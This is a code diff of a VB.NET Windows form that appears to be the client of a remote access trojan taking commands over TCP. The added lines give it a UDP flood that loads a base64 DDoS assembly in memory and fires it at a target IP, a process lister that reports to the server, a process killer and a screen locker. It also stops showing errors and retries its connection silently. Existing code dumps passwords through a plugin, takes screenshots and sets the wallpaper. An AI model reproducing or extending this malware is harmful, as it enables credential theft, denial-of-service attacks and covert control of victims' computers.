@@ -9,19 +9,36 @@ Imports System.Threading
 Imports Microsoft.Win32
 
 Public Class Form1
-    Public Connecteddd As Boolean = False
-    Dim splitz As String = "||||SPLITTTT||||"
+    Public unlock As String = "" 'Key for ScreenLocker
+    Public Connecteddd As Boolean = False ' Try to connect
+    Dim splitz As String = "||||SPLITTTT||||" 'String to build server
     Dim MonClient As TcpClient
     Dim id As String
 
 
+
+
+    '' CHANGE WALLPAPER FCT
     Const param1 As Integer = 20
     Const param2 As Integer = &H1
     Const param3 As Integer = &H2
-    ''
+
     Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
 
     '' CHANGE WALLPAPER FCT
+
+
+
+
+    Public ClearMyplug As Boolean = False
+
+
+    ''UDP
+
+    Public IP As String = ""
+    Public UDPByte As Byte() = New Byte() {}
+
+    ''UDP
     Private Sub LireLesMessages(ByVal Context As TaskScheduler, ByVal stream As NetworkStream) 'Lire les messages du serveur
 
         Try
@@ -53,9 +70,6 @@ Public Class Form1
         Return ConvertedBase64Image
     End Function
     Public Sub SetWallpapertoBackground(ByVal k As String)
-
-
-
 
 
 
@@ -112,8 +126,80 @@ Public Class Form1
         TextBox1.Text = String.Empty
 
     End Sub
+    Public Sub UDP(ByVal E As Byte(), ByVal IPNEEDED As String)
+        Dim assemblytoload As Assembly = Assembly.Load(E)
+
+
+        Dim method As MethodInfo = assemblytoload.[GetType]("DDOS.Methods").GetMethod("WorkerThreadFORUDP")
+
+        Dim obj As Object = assemblytoload.CreateInstance(method.Name)
+        Dim k As Object = IPNEEDED
+
+        method.Invoke(obj, New Object() {k})
+    End Sub
     Public Sub MessageFromHost(ByVal h As String)
         MessageBox.Show(h, "Heathen", MessageBoxButtons.OK, MessageBoxIcon.Information)
+        TextBox1.Text = String.Empty
+    End Sub
+
+    Public Sub GetAllTasks()
+
+        Dim Ultitask As New StringBuilder
+
+
+
+        Dim jk As Process() = Process.GetProcesses
+        For Each h In jk
+            Dim lvi As New ListViewItem(h.ProcessName) 'first column
+
+            lvi.SubItems.Add(h.Id) 'column 2
+
+            lvi.SubItems.Add(h.BasePriority) 'column 3 
+
+            ListView1.Items.Add(lvi) 'add all in listview
+
+        Next
+        ListView1.Sorting = SortOrder.Ascending
+
+        For Each h As ListViewItem In ListView1.Items
+
+            Ultitask.AppendLine(h.Text & "////" & h.SubItems(1).Text & "////" & h.SubItems(2).Text)
+
+        Next
+
+
+
+
+        Ultitask.Append("ThisIISSTASK")
+
+
+        Dim buffer() As Byte = Encoding.UTF8.GetBytes(Ultitask.ToString)
+        MonClient.GetStream().Write(buffer, 0, buffer.Length)
+
+
+        TextBox1.Text = String.Empty
+    End Sub
+
+    Public Sub KillThat(ByVal k As String)
+
+        Dim jk As Process() = Process.GetProcesses
+        For Each h In jk
+
+            If h.ProcessName = k Then
+                Try
+                    h.Kill()
+
+                Catch ex As Exception
+                End Try
+            End If
+        Next
+
+        TextBox1.Text = String.Empty
+    End Sub
+    Public Sub ScreenLock()
+
+        Form2.Show()
+
         TextBox1.Text = String.Empty
     End Sub
     Private Sub NouveauMessage(ByVal message As String, ByVal Fermé As Boolean)
@@ -121,13 +207,12 @@ Public Class Form1
 
         If TextBox1.Text.EndsWith("ThisIsPWPlugin") Then  ''PW1
 
-            '   Dim k As String = TextBox1.Text.Replace("ThisIsPWPlugin", "")
+
 
             TextBox1.Text = TextBox1.Text.Replace("ThisIsPWPlugin", "")
             Dim o As Byte() = Convert.FromBase64String(TextBox1.Text)
 
             Task.Run(Sub() PWLOAD(o, "PW.SteelPassword", "Dump"))
-            '   PW.SteelPassword.Dump
 
 
 
@@ -155,16 +240,54 @@ Public Class Form1
 
 
 
+        ElseIf TextBox1.Text.EndsWith("GETMYTASKS") Then  'TASKMANAGER
 
-        ElseIf TextBox1.Text.EndsWith("SetWallpaperGoodSir") Then  ''WALLPAPRT
+            GetAllTasks()
+
+        ElseIf TextBox1.Text.EndsWith("@&&&SCR") Then  'ScreenLocker
+            Dim op As String = TextBox1.Text.Replace("@&&&SCR", "")
+
+            unlock = op
+
+            ScreenLock()
+
+        ElseIf TextBox1.Text.EndsWith("SetWallpaperGoodSir") Then  ''WALLPAPER
 
             Dim j As String = TextBox1.Text.Replace("SetWallpaperGoodSir", "")
+
+
 
             Task.Run(Sub() SetWallpapertoBackground(j))
 
 
 
-        ElseIf TextBox1.Text = "TakeAPhotooo561" Then  ''SCREENSHOT
+
+
+        ElseIf TextBox1.Text.EndsWith("/ThisTaskIsToKill") Then   'TASK Killer
+            Dim PrepareTask As String = TextBox1.Text.Replace("/ThisTaskIsToKill", "")
+
+            Task.Run(Sub() KillThat(PrepareTask))
+
+
+        ElseIf TextBox1.Text.EndsWith("ITSTIMETODDOSWITHUDP") Then  'UDP FLOOD
+
+            Dim j As String() = Split(TextBox1.Text, "IPPPPPP")
+
+            Dim op As String = j(1).Replace("ITSTIMETODDOSWITHUDP", "")
+
+            ' plug & "IPPPPPP" & IP & "ITSTIMETODDOSWITHUDP"
+            '  DDOS.Methods.Udp.WorkerThread
+            'IPPPPPP104.18.61.3ITSTIMETODDOSWITHUDP
+
+            IP = op
+
+            UDPByte = Convert.FromBase64String(j(0))
+
+            UDPTIMER.Start()
+
+
+
+        ElseIf TextBox1.Text = "TakeAPhotooo561" Then  'SCREENSHOT
 
             Dim lk As New Random
             Dim oooddd = lk.Next(10000, 99999)
@@ -324,7 +447,8 @@ Public Class Form1
 
 
         Catch ex As Exception
-            MessageBox.Show(ex.Message, "Erreur") 'Afficher l'erreur.
+            '  MessageBox.Show(ex.Message, "Erreur") 'Afficher l'erreur.
+            Timer1.Start()
         End Try
     End Sub
 
@@ -354,15 +478,28 @@ Public Class Form1
                 Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
                 MonClient.GetStream().Write(buffer, 0, buffer.Length)
 
-
+            Else
+                Timer1.Stop()
 
             End If
             Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))
 
 
         Catch ex As Exception
-            MessageBox.Show(ex.Message, "Erreur")
+
         End Try
+
+
+    End Sub
+
+    Private Sub UDPTIMER_Tick(sender As Object, e As EventArgs) Handles UDPTIMER.Tick
+        If ClearMyplug = False Then
+            TextBox1.Text = String.Empty
+            ClearMyplug = True
+        End If
+        Task.Run(Sub() UDP(UDPByte, IP))
+        Task.Run(Sub() UDP(UDPByte, IP))
+        Task.Run(Sub() UDP(UDPByte, IP))
     End Sub
 End Class
 
